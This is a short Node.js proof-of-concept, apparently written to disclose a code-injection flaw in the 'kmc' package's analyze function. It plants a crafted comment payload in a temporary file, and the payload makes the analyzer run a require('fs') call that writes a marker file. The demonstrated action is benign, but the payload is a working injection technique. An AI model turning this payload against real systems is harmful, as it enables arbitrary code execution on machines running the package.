const fs = require("fs");
let kmc = require("./node_modules/kmc/lib/index"); // no idea how to get to this file otherwise
 
fs.writeFileSync("./exploit.js", "//{requires:[require('fs').writeFileSync('kmc-success.txt','23')]});");
try {
    kmc.analyze("./exploit.js");
} catch(e) {}
fs.unlinkSync("./exploit.js");